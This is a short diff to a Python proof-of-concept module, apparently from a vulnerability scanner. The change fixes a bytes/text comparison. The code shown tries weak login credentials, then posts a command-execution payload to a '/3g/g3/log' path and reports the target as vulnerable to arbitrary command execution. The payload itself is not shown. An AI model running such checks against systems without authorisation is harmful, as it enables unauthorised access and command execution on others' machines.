@@ -51,7 +51,7 @@ class Poc(ABPoc):
                 path=path, up=post_data))
             response = s.post(path, data=post_data)
 
-            if response.content == '1':
+            if response.text == '1':
                 self.output.warn(self.vuln, '发现弱口令 {up}'.format(up=post_data))
 
                 path = self.target + '/3g/g3/log'
@@ -59,7 +59,7 @@ class Poc(ABPoc):
                     '发送 payload={0} 到 {1}'.format(code_exec, path))
                 result = s.post(path, data=code_exec)
 
-                if 'vuln' in result.content:
+                if 'vuln' in result.text:
                     self.output.report(
                         self.vuln,
                         "目标 {url} 存在 /3g/g3/log 任意命令执行漏洞".format(url=self.target))
